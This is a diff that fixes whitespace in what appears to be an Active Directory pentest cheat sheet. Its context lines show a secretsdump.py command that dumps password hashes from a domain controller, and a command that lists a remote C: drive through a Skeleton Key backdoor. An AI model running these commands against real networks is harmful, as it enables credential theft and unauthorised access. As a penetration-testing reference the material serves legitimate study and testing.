@@ -136,7 +136,7 @@ The encryption key was released, so it is possible to decrypt GPP policies that 
 
  > 
  > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> myDomain<font color=red>/</font>myUser<font color=red>:</font>myPass<font color=red>@</font>\[TARGET_DC_IP\]**<br>
- > Connect to the target and dump hashes. 
+ > Connect to the target and dump hashes.
 
 ---
 
@@ -479,7 +479,7 @@ The Skeleton Key is backdoor: this attack set a master password for domain Admin
 
  > 
  > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**<br>
- > List C: drive content using Skleton Key backdoor. 
+ > List C: drive content using Skleton Key backdoor.
 
 ---
 
